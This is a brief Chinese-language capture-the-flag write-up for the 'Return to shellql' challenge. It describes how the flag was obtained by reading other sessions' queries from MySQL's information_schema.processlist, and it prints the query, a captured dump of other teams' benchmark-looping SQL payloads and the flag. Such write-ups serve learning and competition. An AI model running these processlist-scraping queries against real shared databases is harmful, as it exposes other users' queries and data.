# Return to shellql (shellretql)

黑人問號的一題

這題跟去年幾乎一樣，Payload可以直接拿來用

shellme.so有上 seccomp ，只能 read / write / exit

然後flag在`/flag`

除了能像去年一樣任意Query Mysql外，找不到其他可以讀檔的洞

Mysql的權限也只有SELECT，沒辦法`load_file`

最後經過漫長的一天半，主辦方維修完之後

發現從`Processlist`就能任意撈到FLAG惹....

`select group_concat(info) from information_schema.processlist;`:

```
     (    def    group_concat(info)    U                "        select "OOO{WaTCH ouT FoR THaT ReTuRN TRiP}", sleep(5),SELECT @query:=0x3a3a UNION SELECT @tmp:=0x20 UNION SELECT benchmark(500000,(@tmp:= (SELECT Group_concat(info) FROM information_schema.processlist WHERE info NOT LIKE 0x7265706c616365 or sleep(0) ))^(IF((@tmp!=0x00)&&(@query NOT LIKE concat(0x253a3a,replace(@tmp,0x0a,0x5c5c6e),0x3a3a25)), @query:=concat(@query,replace(@tmp,0x0a,0x5c6e),0x3a3a),0 ))) UNION SELECT @query limit 3,1,SELECT @query:=0x3a3a UNION SELECT @tmp:=0x20 UNION SELECT benchmark(500000,(@tmp:= (SELECT Group_concat(info) FROM information_schema.processlist WHERE info NOT LIKE 0x7265706c616365 or sleep(0) ))^(IF((@tmp!=0x00)&&(@query NOT LIKE concat(0x253a3a,replace(@tmp,0x0a,0x5c5c6e),0x3a3a25)), @query:=concat(@query,replace(@tmp,0x0a,0x5c6e),0x3a3a),0 ))) UNION SELECT @query limit 3,1,SELECT a.b FROM (SELECT @dummy, @query:='<START>',@tmp:=0x20, benchmark(500000,(@tmp:= (SELECT Group_concat(info) FROM information_schema.processlist WHERE info not like '%dummy%' or sleep(0)))or(IF((@quer       "
```

flag: `OOO{WaTCH ouT FoR THaT ReTuRN TRiP}`

(15分鐘內從1隊解，變成20+隊解XD)

貌似韓國隊一開始就是用這招撈到主辦方的Exploit，所以後來主辦直接大放送flag
